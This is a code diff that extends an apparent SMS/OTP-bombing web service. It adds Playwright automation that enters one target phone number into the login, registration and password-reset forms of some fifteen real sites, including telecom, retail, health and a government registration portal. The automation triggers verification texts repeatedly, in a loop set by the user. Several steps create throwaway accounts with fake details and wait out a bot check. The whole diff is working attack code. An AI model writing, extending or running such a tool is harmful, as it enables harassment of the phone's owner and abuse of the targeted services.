@@ -50,36 +50,323 @@ function sendBDTickets(phone) {
   })();
 }
 
-const sites = [
+const browserSites = [
+  {
+    name: "Arogga", url: "https://www.arogga.com/account",
+    steps: [
+      { action: "wait", ms: 2000 },
+      { action: "click", selector: 'button:has-text("Login")' },
+      { action: "wait", ms: 2000 },
+      { action: "fill", selector: 'input[placeholder="Enter phone number"]' },
+      { action: "wait", ms: 500 },
+      { action: "click", selector: 'button:has-text("Send")' },
+      { action: "wait", ms: 2000 },
+    ],
+  },
+  {
+    name: "IqraLive", url: "https://iqra-live.com/",
+    steps: [
+      { action: "fill", selector: "#mobile" },
+      { action: "wait", ms: 500 },
+      { action: "click", selector: 'button:has-text("Sign In")' },
+      { action: "wait", ms: 2000 },
+    ],
+  },
+  {
+    name: "Apex4u", url: "https://apex4u.com/sign-in",
+    steps: [
+      { action: "wait", ms: 5000 },
+      { action: "fill", selector: 'input.form-field' },
+      { action: "wait", ms: 500 },
+      { action: "click", selector: '[data-testid="proceed-button"]' },
+      { action: "wait", ms: 2000 },
+    ],
+  },
+  {
+    name: "MedEasy", url: "https://medeasy.health/",
+    steps: [
+      { action: "wait", ms: 3000 },
+      { action: "click", selector: 'text=Sign In' },
+      { action: "wait", ms: 3000 },
+      { action: "fill", selector: 'input[name="phone"]' },
+      { action: "wait", ms: 500 },
+      { action: "click", selector: 'button:has-text("Send OTP")' },
+      { action: "wait", ms: 2000 },
+    ],
+  },
+  {
+    name: "Chorki", url: "https://www.chorki.com/login",
+    steps: [
+      { action: "wait", ms: 5000 },
+      { action: "wait_turnstile" },
+      { action: "fill_phone", selector: 'input.react-international-phone-input' },
+      { action: "check", selector: 'input[name="userConsent"]' },
+      { action: "wait", ms: 500 },
+      { action: "click", selector: 'button[type="submit"]' },
+      { action: "wait", ms: 3000 },
+    ],
+  },
+  {
+    name: "Robi", url: "https://www.robi.com.bd/en/auth/login",
+    steps: [
+      { action: "wait", ms: 5000 },
+      { action: "robi" },
+      { action: "wait", ms: 4000 },
+    ],
+  },
+  {
+    name: "MyGov", url: "https://idp-v2.live.mygov.bd/registration", waitUntil: "domcontentloaded",
+    steps: [
+      { action: "wait", ms: 3000 },
+      { action: "fill", selector: 'input[name="citizen_name"]', value: "Test User" },
+      { action: "wait", ms: 500 },
+      { action: "fill", selector: 'input#mobile' },
+      { action: "wait", ms: 500 },
+      { action: "click", selector: 'button[type="submit"]' },
+      { action: "wait", ms: 3000 },
+    ],
+  },
+  {
+    name: "Sailor", url: "https://sailor.clothing/login",
+    steps: [
+      { action: "wait", ms: 3000 },
+      { action: "click", selector: 'button:has-text("registration")' },
+      { action: "wait", ms: 1000 },
+      { action: "fill", selector: 'input[placeholder="01XXXXXXXXX"]' },
+      { action: "wait", ms: 300 },
+      { action: "fill_rnd", selector: 'input[placeholder="Enter email address (example@example.com)"]', prefix: "sailor_", suffix: "@mail.com" },
+      { action: "wait", ms: 300 },
+      { action: "fill", selector: 'input[placeholder="Enter Password"]', value: "Test1234" },
+      { action: "wait", ms: 300 },
+      { action: "fill", selector: 'input[placeholder="Enter confirm-password"]', value: "Test1234" },
+      { action: "wait", ms: 300 },
+      { action: "click", selector: 'button:has-text("create account")' },
+      { action: "wait", ms: 3000 },
+    ],
+  },
+  {
+    name: "LeraveCraze", url: "https://www.lerevecraze.com/login/",
+    steps: [
+      { action: "wait", ms: 3000 },
+      { action: "fill", selector: "input#account_display_name" },
+      { action: "wait", ms: 500 },
+      { action: "click", selector: "input#lrv-login-btn" },
+      { action: "wait", ms: 3000 },
+    ],
+  },
+  {
+    name: "Othoba", url: "https://othoba.com/register?returnUrl=%2F", waitUntil: "domcontentloaded",
+    steps: [
+      { action: "wait", ms: 4000 },
+      { action: "fill", selector: "input#Phone" },
+      { action: "wait", ms: 300 },
+      { action: "fill_rnd", selector: "input#Email", prefix: "oth_", suffix: "@mail.com" },
+      { action: "wait", ms: 300 },
+      { action: "fill", selector: "input#FirstName", value: "Test" },
+      { action: "wait", ms: 300 },
+      { action: "fill", selector: "input#LastName", value: "User" },
+      { action: "wait", ms: 300 },
+      { action: "click", selector: 'label:has-text("Male")' },
+      { action: "wait", ms: 300 },
+      { action: "select", selector: 'select[name="DateOfBirthDay"]', value: "15" },
+      { action: "wait", ms: 200 },
+      { action: "select", selector: 'select[name="DateOfBirthMonth"]', value: "6" },
+      { action: "wait", ms: 200 },
+      { action: "select", selector: 'select[name="DateOfBirthYear"]', value: "1995" },
+      { action: "wait", ms: 300 },
+      { action: "fill", selector: "input#Password", value: "Test1234" },
+      { action: "wait", ms: 300 },
+      { action: "fill", selector: "input#ConfirmPassword", value: "Test1234" },
+      { action: "wait", ms: 300 },
+      { action: "click", selector: "button#register-button" },
+      { action: "wait", ms: 5000 },
+    ],
+  },
+  {
+    name: "PizzaHutBD", url: "https://www.pizzahutbd.com/customer/login",
+    steps: [
+      { action: "wait", ms: 3000 },
+      { action: "fill", selector: "input#locationInput", value: "Gulshan 1" },
+      { action: "wait", ms: 1500 },
+      { action: "click", selector: ".pac-item" },
+      { action: "wait", ms: 1000 },
+      { action: "click", selector: "button.confirm-btn" },
+      { action: "wait", ms: 4000 },
+      { action: "goto", url: "https://www.pizzahutbd.com/customer/login" },
+      { action: "wait", ms: 3000 },
+      { action: "fill", selector: "input#full_name", value: "User" },
+      { action: "fill", selector: "input#phone" },
+      { action: "wait", ms: 500 },
+      { action: "click", selector: 'button:has-text("Sign In")' },
+      { action: "wait", ms: 5000 },
+    ],
+  },
+  {
+    name: "Kimi", url: "https://www.kimi.com/login", waitUntil: "domcontentloaded",
+    steps: [
+      { action: "wait", ms: 8000 },
+      { action: "click", selector: 'input[placeholder="+86"]' },
+      { action: "wait", ms: 500 },
+      { action: "click", selector: 'span:has-text("+880")' },
+      { action: "wait", ms: 500 },
+      { action: "fill", selector: 'input[placeholder="Phone number"]' },
+      { action: "wait", ms: 500 },
+      { action: "click", selector: 'button:has-text("Send Code")' },
+      { action: "wait", ms: 3000 },
+    ],
+  },
+  {
+    name: "Ostad", url: "https://ostad.app/login",
+    steps: [
+      { action: "wait", ms: 3000 },
+      { action: "click", selector: '.cursor-pointer.py-2.px-3:nth-of-type(2)' },
+      { action: "wait", ms: 1000 },
+      { action: "fill", selector: 'input[type="number"]' },
+      { action: "wait", ms: 500 },
+      { action: "click", selector: 'button[type="submit"]' },
+      { action: "wait", ms: 3000 },
+    ],
+  },
+  {
+    name: "Bishworang", url: "https://www.bishworang.com.bd/login",
+    steps: [
+      { action: "wait", ms: 3000 },
+      { action: "bishworang_forgot" },
+      { action: "wait", ms: 3000 },
+    ],
+  },
+  {
+    name: "Ilyn", url: "https://ilyn.global/bd/en/auth/forgot-password", waitUntil: "domcontentloaded",
+    steps: [
+      { action: "wait", ms: 6000 },
+      { action: "ilyn_forgot" },
+      { action: "wait", ms: 5000 },
+    ],
+  },
+];
+
+const apiSites = [
   { name: "MedEasy", fn: sendMedEasy },
   { name: "RedX", fn: sendRedX },
   { name: "BDTickets", fn: sendBDTickets },
 ];
 
+const { chromium } = require("playwright");
+
+let browser;
+let browserReady = false;
+
+async function runSite(site, phone) {
+  let ctx;
+  try {
+    ctx = await browser.newContext();
+    const page = await ctx.newPage();
+    await page.goto(site.url, { waitUntil: site.waitUntil || "networkidle", timeout: 60000 });
+    for (const step of site.steps) {
+      if (step.action === "fill") {
+        await page.waitForSelector(step.selector, { timeout: 30000 });
+        const val = step.value || phone;
+        await page.fill(step.selector, val);
+      } else if (step.action === "click") {
+        await page.waitForSelector(step.selector, { timeout: 30000 });
+        await page.click(step.selector);
+      } else if (step.action === "wait") {
+        await page.waitForTimeout(step.ms);
+      } else if (step.action === "check") {
+        await page.waitForSelector(step.selector, { timeout: 30000 });
+        await page.check(step.selector);
+      } else if (step.action === "fill_phone") {
+        await page.waitForSelector(step.selector, { timeout: 30000 });
+        await page.fill(step.selector, `+880${phone.slice(-10)}`);
+      } else if (step.action === "wait_turnstile") {
+        await page.waitForTimeout(5000);
+        try { await page.waitForFunction(() => { const el = document.querySelector('input[name="cf-turnstile-response"]'); return el && el.value && el.value.length > 0; }, { timeout: 20000 }); } catch {}
+      } else if (step.action === "goto") {
+        await page.goto(step.url, { waitUntil: "networkidle", timeout: 30000 });
+      } else if (step.action === "fill_rnd") {
+        await page.waitForSelector(step.selector, { timeout: 30000 });
+        const val = `${step.prefix || ""}${Date.now()}${step.suffix || ""}`;
+        await page.fill(step.selector, val);
+      } else if (step.action === "select") {
+        await page.waitForSelector(step.selector, { timeout: 30000 });
+        await page.selectOption(step.selector, step.value);
+      } else if (step.action === "bishworang_forgot") {
+        await page.evaluate((phone) => {
+          const a = document.querySelector("a.forget-pass");
+          if (a) a.click();
+          setTimeout(() => {
+            const inp = document.querySelector(".forgot-pass-modal input");
+            if (inp) { inp.value = phone; inp.dispatchEvent(new Event("input", { bubbles: true })); }
+            setTimeout(() => {
+              const btn = document.querySelector(".forgot-pass-modal .send-btn");
+              if (btn) btn.click();
+            }, 500);
+          }, 1000);
+        }, phone);
+      } else if (step.action === "ilyn_forgot") {
+        await page.evaluate((phone) => {
+          const inp = document.querySelector('input[type="text"]');
+          if (!inp) return;
+          const nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
+          nativeSetter.call(inp, phone);
+          inp.dispatchEvent(new Event("input", { bubbles: true }));
+          inp.dispatchEvent(new Event("change", { bubbles: true }));
+          setTimeout(() => {
+            const btn = document.querySelector('button[type="submit"]');
+            if (btn && !btn.disabled) btn.click();
+          }, 500);
+        }, phone);
+      } else if (step.action === "robi") {
+        await page.evaluate((phone) => {
+          const accept = Array.from(document.querySelectorAll("button")).find(b => b.textContent.includes("Accept Cookies"));
+          if (accept) accept.click();
+          setTimeout(() => { const bd = document.querySelector(".MuiBackdrop-root"); if (bd) bd.click(); }, 500);
+          setTimeout(() => { const btn = Array.from(document.querySelectorAll("button")).find(b => b.textContent.includes("Log In")); if (btn) btn.click(); }, 1500);
+          setTimeout(() => {
+            const input = document.querySelector('input[aria-label="mobile-number"]');
+            if (!input) return;
+            const nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
+            nativeSetter.call(input, phone);
+            input.dispatchEvent(new Event("input", { bubbles: true }));
+            const sendBtn = Array.from(document.querySelectorAll("button")).find(b => b.textContent.includes("Send OTP"));
+            if (sendBtn && !sendBtn.disabled) sendBtn.click();
+          }, 3500);
+        }, phone);
+      }
+    }
+    return { name: site.name, status: "DONE" };
+  } catch (err) {
+    return { name: site.name, status: "FAILED", error: err.message.split("\n")[0] };
+  } finally {
+    if (ctx) await ctx.close();
+  }
+}
+
 async function run(phone, count, delay) {
   const withTimeout = (p, ms) => Promise.race([p, new Promise((_, r) => setTimeout(() => r("__TIMEOUT__"), ms))]);
 
   for (let i = 0; i < count; i++) {
-    const results = await Promise.allSettled(
-      sites.map((site) => withTimeout(site.fn(phone), 15000))
-    );
-
-    console.log(`[${i + 1}/${count}]`);
-    for (let idx = 0; idx < results.length; idx++) {
-      const r = results[idx];
-      const name = sites[idx].name;
-      let status, error;
-      if (r.status === "fulfilled") {
-        const v = r.value;
-        status = v === "DONE" ? "DONE" : v.startsWith("HTTP") ? v : "FAILED";
-        error = v !== "DONE" && !v.startsWith("HTTP") ? v : undefined;
-      } else {
-        status = "FAILED";
-        error = r.reason === "__TIMEOUT__" ? "timed out" : String(r.reason).split("\n")[0];
-      }
-      console.log(`  [${name}] ${status}${error ? " - " + error : ""}`);
+    const tasks = [];
+    for (const site of browserSites) {
+      tasks.push(withTimeout(runSite(site, phone), 90000).then(v => {
+        if (typeof v === "string" && v === "__TIMEOUT__") return { name: site.name, status: "FAILED", error: "timed out" };
+        return v;
+      }));
+    }
+    for (const site of apiSites) {
+      tasks.push(withTimeout(site.fn(phone), 15000).then(v => {
+        if (v === "__TIMEOUT__") return { name: site.name, status: "FAILED", error: "timed out" };
+        if (typeof v === "string") return { name: site.name, status: v === "DONE" ? "DONE" : v.startsWith("HTTP") ? v : "FAILED", error: v !== "DONE" && !v.startsWith("HTTP") ? v : undefined };
+        return v;
+      }));
     }
 
+    const results = await Promise.allSettled(tasks);
+    console.log(`[${i + 1}/${count}]`);
+    for (const r of results) {
+      const v = r.status === "fulfilled" ? r.value : { name: "Unknown", status: "FAILED", error: String(r.reason).split("\n")[0] };
+      console.log(`  [${v.name}] ${v.status}${v.error ? " - " + v.error : ""}`);
+    }
     if (i < count - 1 && delay > 0) {
       console.log(`  Waiting ${delay}s ...`);
       await new Promise((r) => setTimeout(r, delay * 1000));
@@ -120,10 +407,17 @@ app.post("/", async (req, res) => {
     origLog.apply(console, args);
   };
 
+  if (!browser) {
+    res.write(!browserReady ? "Chromium is still launching, try again in a moment...\n" : "Chromium failed to launch\n");
+    res.write(`</pre><br><a href="/">Back</a>`);
+    res.end();
+    return;
+  }
+
   try {
     await Promise.race([
       run(phone, count, delay),
-      new Promise((_, r) => setTimeout(r, 120000, new Error("Global timeout"))),
+      new Promise((_, r) => setTimeout(r, 180000, new Error("Global timeout"))),
     ]);
   } catch (e) {
     const err = "ERROR: " + e.message.split("\n")[0];
@@ -138,4 +432,16 @@ app.post("/", async (req, res) => {
 
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
+  console.log("Launching Chromium...");
+  chromium.launch({
+    headless: true,
+    executablePath: process.env.PLAYWRIGHT_CHROMIUM_EXECUTABLE_PATH || "/usr/bin/chromium",
+    args: ["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"],
+  }).then(b => {
+    browser = b;
+    browserReady = true;
+    console.log("Chromium ready");
+  }).catch(e => {
+    console.error("Chromium launch failed:", e.message);
+  });
 });
